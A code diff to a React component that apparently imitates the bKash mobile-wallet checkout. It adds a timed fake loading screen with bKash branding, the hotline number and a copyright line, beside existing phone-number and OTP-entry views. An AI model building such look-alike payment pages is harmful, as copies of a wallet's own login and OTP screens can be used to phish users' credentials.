@@ -6,6 +6,7 @@ import bkashLogoImg from "@/assets/bkash-logo.png";
 
 const BkashPayment = () => {
   const navigate = useNavigate();
+  const [isLoading, setIsLoading] = useState(true);
   const [phoneNumber, setPhoneNumber] = useState("");
   const [showCancelView, setShowCancelView] = useState(false);
   const [showOtpView, setShowOtpView] = useState(false);
@@ -16,6 +17,14 @@ const BkashPayment = () => {
   const [resendTimer, setResendTimer] = useState(30);
   const [resendStatus, setResendStatus] = useState<'idle' | 'sending' | 'sent'>('idle');
   const [redirectTimer, setRedirectTimer] = useState(5);
+
+  // Initial loading effect
+  useEffect(() => {
+    const timer = setTimeout(() => {
+      setIsLoading(false);
+    }, 2000);
+    return () => clearTimeout(timer);
+  }, []);
   
   const validPrefixes = ["013", "014", "015", "016", "017", "018", "019"];
   
@@ -132,7 +141,30 @@ const BkashPayment = () => {
         </div>
 
         {/* Conditional Content */}
-        {showFailedView ? (
+        {isLoading ? (
+          <>
+            {/* Pink Section - Loading */}
+            <div className="bg-[#E2136E] flex-1 flex flex-col items-center justify-center">
+              <div className="flex items-center gap-2 mb-3">
+                <span className="w-3 h-3 bg-white/60 rounded-full animate-[pulse_1s_ease-in-out_infinite]"></span>
+                <span className="w-3 h-3 bg-white/80 rounded-full animate-[pulse_1s_ease-in-out_0.2s_infinite]"></span>
+                <span className="w-3 h-3 bg-white rounded-full animate-[pulse_1s_ease-in-out_0.4s_infinite]"></span>
+              </div>
+              <p className="text-white text-sm font-medium">Loading</p>
+            </div>
+
+            {/* Footer */}
+            <div className="bg-white px-4 py-2 text-center border-t shrink-0">
+              <div className="flex items-center justify-center gap-1 text-[#E2136E] mb-0.5">
+                <Phone className="w-3 h-3" />
+                <span className="text-xs font-medium">16247</span>
+              </div>
+              <p className="text-gray-500 text-[10px]">
+                © 2025 bKash, All Rights Reserved
+              </p>
+            </div>
+          </>
+        ) : showFailedView ? (
           <>
             {/* Pink Section - Payment Failed */}
             <div className="bg-[#E2136E] flex-1 flex flex-col items-center justify-center">
